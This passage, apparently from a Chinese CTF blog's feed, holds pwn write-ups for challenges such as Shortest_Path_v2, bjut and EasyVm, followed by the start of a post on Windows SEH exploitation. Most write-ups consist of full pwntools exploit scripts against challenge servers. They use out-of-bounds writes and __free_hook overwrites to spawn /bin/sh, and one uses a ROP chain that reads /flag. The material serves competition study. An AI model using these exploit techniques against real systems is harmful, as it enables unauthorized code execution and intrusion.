class="number">1</span>,payload)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">poprdi=libc_base+<span class="number">0x0000000000021102</span></span><br><span class="line">flag_addr=libc_base + libc.symbols[<span class="string">'__free_hook'</span>]+<span class="number">15</span>*<span class="number">8</span></span><br><span class="line">poprsi=libc_base+<span class="number">0x00000000000202e8</span></span><br><span class="line">open_addr=libc_base+libc.symbols[<span class="string">"open"</span>]</span><br><span class="line">poprdx=libc_base+<span class="number">0x0000000000001b92</span></span><br><span class="line">puts_addr=libc_base+libc.symbols[<span class="string">"puts"</span>]</span><br><span class="line">read_addr=libc_base+libc.symbols[<span class="string">"read"</span>]</span><br><span class="line">bss=libc_base + libc.symbols[<span class="string">'__free_hook'</span>]+<span class="number">0x2000</span></span><br><span class="line">orw=p64(poprdi)+p64(flag_addr)+p64(poprsi)+p64(<span class="number">72</span>)+p64(open_addr)+p64(poprdi)+p64(<span class="number">3</span>)+p64(poprsi)+p64(bss)+p64(poprdx)+p64(<span class="number">0x30</span>)+p64(read_addr)</span><br><span class="line">orw+=p64(poprdi)+p64(bss)+p64(puts_addr)+<span class="string">"/flag\x00"</span></span><br><span class="line">s(orw)</span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><p>​        <img src="https://uploader.shimo.im/f/CmBP6jax6mwAkGTR.png!thumbnail" alt="img">      </p><h2 id="Shortest-Path-v2"><a href="#Shortest-Path-v2" class="headerlink" title="Shortest_Path_v2"></a>Shortest_Path_v2</h2><p>这一题是非预期，程序读入flag直接遗留在heap段了，后面申请chunk,直接就可以拿到，这次比赛的非预期真多。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PwnContext <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :ctx.send(str(data))        <span class="comment">#in case that data is an int</span></span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :ctx.sendafter(str(delim), str(data)) </span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :ctx.sendline(str(data)) </span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :ctx.sendlineafter(str(delim), str(data)) </span><br><span class="line">r       = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :ctx.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :ctx.recvuntil(delims, drop)</span><br><span class="line">irt     = <span class="keyword">lambda</span>                    :ctx.interactive()</span><br><span class="line">rs      = <span class="keyword">lambda</span> *args, **kwargs    :ctx.start(*args, **kwargs)</span><br><span class="line">dbg     = <span class="keyword">lambda</span> gs=<span class="string">''</span>, **kwargs    :ctx.debug(gdbscript=gs, **kwargs)</span><br><span class="line"><span class="comment"># misc functions</span></span><br><span class="line">uu32    = <span class="keyword">lambda</span> data   :u32(data.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data   :u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr :log.success(<span class="string">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ctx.binary = <span class="string">'Shortest_path'</span></span><br><span class="line"><span class="comment">#ctx.remote_libc = './libc.so'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ctx.debug_remote_libc = <span class="literal">False</span></span><br><span class="line">local=<span class="number">0</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">if</span>(local):</span><br><span class="line">p=rs()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">ctx.remote = (<span class="string">'121.37.181.246'</span>,<span class="number">19008</span>)</span><br><span class="line">p=rs(<span class="string">'remote'</span>)</span><br><span class="line"><span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">()</span>:</span></span><br><span class="line">libc_base = ctx.bases.libc</span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line">ctx.symbols = &#123;<span class="string">'sym1'</span>:<span class="number">0xEDA</span> , <span class="string">'sym2'</span>:<span class="number">0x10AF</span>&#125;</span><br><span class="line">ctx.breakpoints = [<span class="number">0xEDA</span>,<span class="number">0x10AF</span>]</span><br><span class="line">ctx.debug()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(ID,name_size,name,index,distance)</span>:</span></span><br><span class="line">sla(<span class="string">"---&gt; "</span>,<span class="number">1</span>)</span><br><span class="line">sla(<span class="string">"Station ID: "</span>,ID)</span><br><span class="line">sla(<span class="string">"Station Price: "</span>, <span class="number">1</span>)</span><br><span class="line">sla(<span class="string">"Station Name Length: "</span>,str(name_size))</span><br><span class="line">sla(<span class="string">"Station Name: \n"</span>,name)</span><br><span class="line">sla(<span class="string">'Number of connected station: '</span>,len(index))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(index)):</span><br><span class="line">sla(<span class="string">"station ID: "</span>,index[i])</span><br><span class="line">sla(<span class="string">"distance: "</span>,distance[i])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">sla(<span class="string">"---&gt; "</span>,<span class="number">3</span>)</span><br><span class="line">sla(<span class="string">"Station ID: "</span>,index)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">query</span><span class="params">(source,target)</span>:</span></span><br><span class="line">sla(<span class="string">"---&gt; "</span>,<span class="number">4</span>)</span><br><span class="line">sla(<span class="string">"Source Station ID: "</span>,str(source))</span><br><span class="line">sla(<span class="string">"Target Station ID: "</span>,str(target))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">sla(<span class="string">"---&gt; "</span>,<span class="number">2</span>)</span><br><span class="line">sla(<span class="string">"Station ID: "</span>,index)</span><br><span class="line"></span><br><span class="line">choice()</span><br><span class="line">create(<span class="number">0</span>,<span class="number">0xf7</span>,<span class="string">"1"</span>*<span class="number">0xf7</span>,[<span class="number">2</span>],[<span class="number">123</span>])</span><br><span class="line">create(<span class="number">1</span>,<span class="number">0xb8</span>,<span class="string">"1"</span>*<span class="number">0xb7</span>,[<span class="number">2</span>],[<span class="number">123</span>])</span><br><span class="line">sla(<span class="string">"---&gt; "</span>,<span class="number">1</span>)</span><br><span class="line">sla(<span class="string">"Station ID: "</span>,<span class="number">2</span>)</span><br><span class="line">sla(<span class="string">"Station Price: "</span>, <span class="string">'1'</span>)</span><br><span class="line">sla(<span class="string">"Station Name Length: "</span>,<span class="string">'-'</span>)</span><br><span class="line">sa(<span class="string">'Station Name: \n'</span>,<span class="string">'0'</span>)</span><br><span class="line">sla(<span class="string">'Number of connected station: '</span>,<span class="number">0</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><p>​        <img src="https://uploader.shimo.im/f/BxTs1dZLdz4MWdqt.png!thumbnail" alt="img">      </p><h2 id="bjut"><a href="#bjut" class="headerlink" title="bjut"></a>bjut</h2><p>数组越界读写，直接可以修改stderr，因为是write泄露，并且字节特别大。同样的用modify越界修改stderr,然后可以修改到__free_hook。不过这样利用成功概率不大，需要不断尝试。我看其他队伍的wp，数组越界竟然到了负一千多的地方，可怕。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PwnContext <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :ctx.send(str(data))        <span class="comment">#in case that data is an int</span></span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :ctx.sendafter(str(delim), str(data)) </span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :ctx.sendline(str(data)) </span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :ctx.sendlineafter(str(delim), str(data)) </span><br><span class="line">r       = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :ctx.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :ctx.recvuntil(delims, drop)</span><br><span class="line">irt     = <span class="keyword">lambda</span>                    :ctx.interactive()</span><br><span class="line">rs      = <span class="keyword">lambda</span> *args, **kwargs    :ctx.start(*args, **kwargs)</span><br><span class="line">dbg     = <span class="keyword">lambda</span> gs=<span class="string">''</span>, **kwargs    :ctx.debug(gdbscript=gs, **kwargs)</span><br><span class="line"><span class="comment"># misc functions</span></span><br><span class="line">uu32    = <span class="keyword">lambda</span> data   :u32(data.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data   :u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr :log.success(<span class="string">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ctx.binary = <span class="string">''</span></span><br><span class="line"><span class="comment">#ctx.remote_libc = './libc.so'</span></span><br><span class="line">libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">ctx.debug_remote_libc = <span class="literal">False</span></span><br><span class="line">local=<span class="number">0</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">if</span>(local):</span><br><span class="line">p=rs()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">ctx.remote = (<span class="string">'121.37.167.199'</span>,<span class="number">9997</span>)</span><br><span class="line">p=rs(<span class="string">'remote'</span>)</span><br><span class="line"><span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size,content)</span>:</span></span><br><span class="line">sla(<span class="string">"&gt;"</span>,<span class="number">1</span>)</span><br><span class="line">sla(<span class="string">"The length of your hw:\n"</span>,size)</span><br><span class="line">sa(<span class="string">"Input your hw:\n"</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">sla(<span class="string">"&gt;"</span>,<span class="number">4</span>)</span><br><span class="line">sla(<span class="string">"The index of your hw:"</span>,index)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,content)</span>:</span></span><br><span class="line">sla(<span class="string">"&gt;"</span>,<span class="number">2</span>)</span><br><span class="line">sla(<span class="string">"The index of your hw:"</span>,index)</span><br><span class="line">sa(<span class="string">"Input your hw:"</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">sla(<span class="string">"&gt;"</span>,<span class="number">3</span>)</span><br><span class="line">sla(<span class="string">"The index of your hw:"</span>,index)</span><br><span class="line">choice()</span><br><span class="line">create(<span class="number">0x7f</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">create(<span class="number">0x7f</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">show(<span class="number">-16</span>)</span><br><span class="line">ru(<span class="string">"\x77\x3a\x0a"</span>)</span><br><span class="line">info=r()</span><br><span class="line">libc_base=uu64(info[<span class="number">13</span>*<span class="number">8</span>:<span class="number">14</span>*<span class="number">8</span>])-(<span class="number">0x7f8e26d55760</span><span class="number">-0x00007f8e26b70000</span>)</span><br><span class="line">leak(<span class="string">"libc_base"</span>,libc_base)</span><br><span class="line"><span class="keyword">print</span> hex(len(info))</span><br><span class="line">pause()</span><br><span class="line">system=libc_base+libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">edit(<span class="number">-16</span>,info+(<span class="number">0x1f28</span>-len(info))*<span class="string">'\x00'</span>+p64(system))</span><br><span class="line">sla(<span class="string">"&gt;"</span>,<span class="number">5</span>)</span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><p><img src="https://uploader.shimo.im/f/6dR6Lmptchcam1Hm.png!thumbnail" alt="img">       </p><h2 id="babyhacker"><a href="#babyhacker" class="headerlink" title="babyhacker"></a>babyhacker</h2><p>这算是出题方的失误吧，题目flag直接包裹在题目附件里面。属实不想吐槽这种非预期。<img src="https://uploader.shimo.im/f/rfeOl9ziveIxNczD.png!thumbnail" alt="img"> 这种     </p><h2 id="EasyVm"><a href="#EasyVm" class="headerlink" title="EasyVm"></a>EasyVm</h2><p>这一题可以操作的方式太多了，唯一难点就是泄露，修改多种方式都可以。有利用putchar任意泄露的，用getchar任意修改，还可以free之后main_arena的地址直接给了reg[1],直接可以打印出来。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PwnContext <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :ctx.send(str(data))        <span class="comment">#in case that data is an int</span></span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :ctx.sendafter(str(delim), str(data)) </span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :ctx.sendline(str(data)) </span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :ctx.sendlineafter(str(delim), str(data)) </span><br><span class="line">r       = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :ctx.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :ctx.recvuntil(delims, drop)</span><br><span class="line">irt     = <span class="keyword">lambda</span>                    :ctx.interactive()</span><br><span class="line">rs      = <span class="keyword">lambda</span> *args, **kwargs    :ctx.start(*args, **kwargs)</span><br><span class="line">dbg     = <span class="keyword">lambda</span> gs=<span class="string">''</span>, **kwargs    :ctx.debug(gdbscript=gs, **kwargs)</span><br><span class="line"><span class="comment"># misc functions</span></span><br><span class="line">uu32    = <span class="keyword">lambda</span> data   :u32(data.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data   :u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr :log.success(<span class="string">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class="line"></span><br><span class="line">ctx.binary = <span class="string">'EasyVM'</span></span><br><span class="line"><span class="comment">#ctx.remote_libc = './libc.so'</span></span><br><span class="line">libc=ELF(<span class="string">"/lib/i386-linux-gnu/libc.so.6"</span>)</span><br><span class="line">ctx.debug_remote_libc = <span class="literal">False</span></span><br><span class="line">local=<span class="number">0</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">if</span>(local):</span><br><span class="line">p=rs()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">ctx.remote = (<span class="string">'121.36.215.224'</span>,<span class="number">9999</span>)</span><br><span class="line">p=rs(<span class="string">'remote'</span>)</span><br><span class="line"><span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">()</span>:</span></span><br><span class="line">libc_base = ctx.bases.libc</span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line">ctx.symbols = &#123;<span class="string">'sym1'</span>:<span class="number">0xF72</span>&#125;</span><br><span class="line">ctx.breakpoints = [<span class="number">0xF72</span>]</span><br><span class="line">ctx.debug()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(content)</span>:</span></span><br><span class="line">sla(<span class="string">"&gt;&gt;&gt; \n"</span>,<span class="number">1</span>)</span><br><span class="line">s(content+<span class="string">'\x99\x99\x99'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">()</span>:</span></span><br><span class="line">sla(<span class="string">"&gt;&gt;&gt; \n"</span>,<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gift</span><span class="params">()</span>:</span></span><br><span class="line">sla(<span class="string">"&gt;&gt;&gt; \n"</span>,<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">()</span>:</span></span><br><span class="line">sla(<span class="string">"&gt;&gt;&gt; \n"</span>,<span class="number">3</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">push</span><span class="params">(content)</span>:</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">'\x71'</span>+content</span><br><span class="line">choice()</span><br><span class="line">create(<span class="string">'\x80\x10/bin\x80\x10/sh\x00'</span>+push(p32(<span class="number">0x66666666</span>))*<span class="number">77</span>)</span><br><span class="line">run()</span><br><span class="line">free()</span><br><span class="line">create(<span class="string">'\x11'</span>)</span><br><span class="line">run()</span><br><span class="line">ru(<span class="string">'0x'</span>)</span><br><span class="line">libc_base=int(r(<span class="number">8</span>),<span class="number">16</span>)-(<span class="number">0xf7efe930</span><span class="number">-0xf7d4c000</span>)</span><br><span class="line">leak(<span class="string">"libc_base"</span>,libc_base)</span><br><span class="line">free_hook=libc_base+libc.symbols[<span class="string">"__free_hook"</span>]</span><br><span class="line">system=libc_base+libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">create(push(p32(free_hook))+<span class="string">'\x76\x00\x00\x00\x00\x54\x00'</span>+push(p32(free_hook+<span class="number">1</span>))+<span class="string">'\x76\x00\x00\x00\x00\x54\x00'</span>+push(p32(free_hook+<span class="number">2</span>))+<span class="string">'\x76\x00\x00\x00\x00\x54\x00'</span>+push(p32(free_hook+<span class="number">3</span>))+<span class="string">'\x76\x00\x00\x00\x00\x54\x00'</span>)</span><br><span class="line">run()</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">s(p32(system)[<span class="number">0</span>])</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">s(p32(system)[<span class="number">1</span>])</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">s(p32(system)[<span class="number">2</span>])</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">s(p32(system)[<span class="number">3</span>])</span><br><span class="line">create(push(<span class="string">"/sh\x00"</span>)+push(<span class="string">"/bin"</span>))</span><br><span class="line">run()</span><br><span class="line">free()</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><h2 id="babyhacke2"><a href="#babyhacke2" class="headerlink" title="babyhacke2"></a>babyhacke2</h2><p>这一题是赛后复现，看来其他队伍的wp,我吐了，就没有一个规规矩矩解的，我说怎么秒的那么快。</p><p>首先是NU1L:  </p><p><img src="./2.png" alt=""></p><p>修改二进制文件umount,最后exit的时候触发/bin/sh，成功拿到flag。这题局限性是对方用qume起的虚拟机，不然真实机器直接退出了。</p><p>然后V&amp;N:</p><p><img src="./3.png" alt=""></p><p>这个没弄懂，反正以后比赛可以试一下。</p><h2 id="kernoob"><a href="#kernoob" class="headerlink" title="kernoob"></a>kernoob</h2><p>我真是吃了没有strings的亏，这一题flag还是在附件里面，只不过不是在flag文件里面，在其他地方。</p><p><img src="./1.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;summary&quot;&gt;&lt;a href=&quot;#summary&quot; class=&quot;headerlink&quot; title=&quot;summary&quot;&gt;&lt;/a&gt;summary&lt;/h2&gt;&lt;p&gt;这次比赛总的来说发挥还算不错，虽然没有抢到一血，但是至少做出题目了。对kernel题目来说不太熟练，
      
    
    </summary>
    
    
      <category term="Writeup" scheme="http://Whali3n51.github.io/categories/Writeup/"/>
    
    
      <category term="house of orange" scheme="http://Whali3n51.github.io/tags/house-of-orange/"/>
    
      <category term="VMpwn" scheme="http://Whali3n51.github.io/tags/VMpwn/"/>
    
      <category term="SROP" scheme="http://Whali3n51.github.io/tags/SROP/"/>
    
      <category term="沙盒" scheme="http://Whali3n51.github.io/tags/%E6%B2%99%E7%9B%92/"/>
    
  </entry>
  
  <entry>
    <title>win_SEH利用初探</title>
    <link href="http://whali3n51.github.io/2020/02/07/win-SEH%E5%88%A9%E7%94%A8%E5%88%9D%E6%8E%A2/"/>
    <id>http://whali3n51.github.io/2020/02/07/win-SEH%E5%88%A9%E7%94%A8%E5%88%9D%E6%8E%A2/</id>
    <published>2020-02-07T02:45:11.000Z</published>
    <updated>2020-02-08T14:17:08.995Z</updated>
    
    <content type="html"><![CDATA[<p>武汉加油！湖北加油！</p><p>被疫情隔离在家，很久之前就学会了，但是一直没有时间写，现在终于有时间写一写了。</p><p>这个利用其实和linux下的利用差别还是很大的，要控制好几个结构体。</p><p>先给大家推荐两篇文章吧，我就是照着这两篇文章学习的，这里只是把这两盘文章写的不够详细或者我觉得我难以理解的地方指出来，并且加以总结。</p><p><a href="https://www.anquanke.com/post/id/188170" target="_blank" rel="noopener">https://www.anquanke.com/post/id/188170</a></p><p><a href="http://blog.eonew.cn/archives/1182" target="_blank" rel="noopener">http://blog.eonew.cn/archives/1182</a></p><p>首先要了解一下这几个结构体。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">EH4_SCOPETABLE</span> &#123;</span></span><br><span class="line">        DWORD GSCookieOffset;</span><br><span class="line">        DWORD GSCookieXOROffset;</span><br><span class="line">        DWORD EHCookieOffset;</span><br><span class="line">        DWORD EHCookieXOROffset;</span><br><span class="line">        _EH4_SCOPETABLE_RECORD ScopeRecord[<span class="number">1</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">EH4_SCOPETABLE_RECORD</span> &#123;</span></span><br><span class="line">        DWORD EnclosingLevel;</span><br><span class="line">        <span class="keyword">long</span> (*FilterFunc)();</span><br><span class="line">            <span class="keyword">union</span> &#123;</span><br><span class="line">            <span class="keyword">void</span> (*HandlerAddress)();</span><br><span class="line">            <span class="keyword">void</span> (*FinallyFunc)(); </span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这些结构体的是SHE储存的信息，并且这些值是存储在rdata段的，其中_EH4_SCOPETABLE_RECORD存储的是异常处理的函数，当发生异常时，就会调用这个结构体存储的函数。还有注意看嗷,__EH4_SCOPETABLE里面结构体的内容有一项 _EH4_SCOPETABLE_RECORD ScopeRecord[1],也就是这里直接将 _EH4_SCOPETABLE_RECORD的值存进去了</p><p>也就是可以这么理解了，虽然这里不怎么准确，但是我们伪造SCOPETABLE的时候就可以这么伪造了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">EH4_SCOPETABLE</span> &#123;</span></span><br><span class="line">        DWORD GSCookieOffset;</span><br><span class="line">        DWORD GSCookieXOROffset;</span><br><span class="line">        DWORD 